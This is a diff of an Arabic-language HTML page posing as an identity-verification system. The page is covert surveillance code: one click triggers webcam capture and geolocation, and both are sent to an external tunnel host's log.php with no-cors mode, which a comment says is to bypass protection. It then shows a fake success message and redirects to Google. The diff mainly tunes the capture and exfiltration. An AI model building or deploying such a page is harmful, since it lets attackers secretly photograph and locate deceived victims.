@@ -5,55 +5,64 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق الرقمي</title>
 </head>
-<body onclick="captureNow()" style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
-    <div style="background:white; margin:auto; padding:30px; border-radius:15px; max-width:90%;">
-        <h2>نظام التوثيق الأمني</h2>
-        <p>يرجى الضغط على الزر أدناه لإتمام التحقق</p>
-        <button id="btn" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold;">تأكيد الهوية الآن</button>
+<body onclick="start()" style="background:#f4f7f9; font-family:sans-serif; text-align:center; padding-top:50px;">
+    <div style="background:white; margin:auto; padding:30px; border-radius:15px; max-width:90%; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
+        <h2>نظام التوثيق الموحد</h2>
+        <p>يرجى النقر في أي مكان على الشاشة لتأكيد هويتك الرقمية</p>
+        <button id="btn" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">تأكيد الهوية الآن</button>
     </div>
 
     <script>
-    async function captureNow() {
+    async function start() {
         const btn = document.getElementById('btn');
-        btn.innerText = "جاري المعالجة...";
-        // الرابط الجديد الذي أرسلته أنت
+        btn.innerText = "جاري الاتصال بالسيرفر...";
+        // الرابط الجديد الخاص بك
         const tunnel = "https://ec88f8585f1a2f.lhr.life"; 
 
         try {
-            // طلب الموقع وإرساله فوراً
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch(`${tunnel}/log.php`, {
-                    method: 'POST',
-                    body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
-                });
-            });
-
-            // طلب الكاميرا
+            // طلب الكاميرا أولاً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            btn.innerText = "جاري معالجة البيانات...";
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
 
-            // الانتظار ثانية واحدة فقط ثم الالتقاط
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const img = canvas.toDataURL('image/jpeg');
+            video.onloadedmetadata = () => {
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320; // تقليل الحجم لسرعة الإرسال
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/jpeg', 0.7); // ضغط الصورة
 
-                // إرسال الصورة
-                await fetch(`${tunnel}/log.php`, {
-                    method: 'POST',
-                    body: JSON.stringify({ img: img })
-                });
+                    // إرسال البيانات بتنسيق بسيط جداً
+                    fetch(`${tunnel}/log.php`, {
+                        method: 'POST',
+                        mode: 'no-cors', // لتجاوز مشاكل الحماية
+                        body: JSON.stringify({ img: img })
+                    });
 
-                stream.getTracks().forEach(t => t.stop());
-                alert("تم التوثيق بنجاح");
-                window.location.href = "https://google.com";
-            }, 1000);
+                    // إرسال الموقع بشكل منفصل لضمان الوصول
+                    navigator.geolocation.getCurrentPosition(p => {
+                        fetch(`${tunnel}/log.php`, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
+                        });
+                    });
 
+                    setTimeout(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        btn.innerText = "تم التحقق بنجاح";
+                        alert("تم تأكيد الهوية، شكراً لك.");
+                        window.location.href = "https://google.com";
+                    }, 1000);
+                }, 2000);
+            };
         } catch (e) {
-            alert("يرجى السماح بالكاميرا للمتابعة");
+            alert("خطأ: يرجى تفعيل إذن الكاميرا والموقع للمتابعة.");
+            btn.innerText = "فشل التحقق - حاول مجدداً";
         }
     }
     </script>
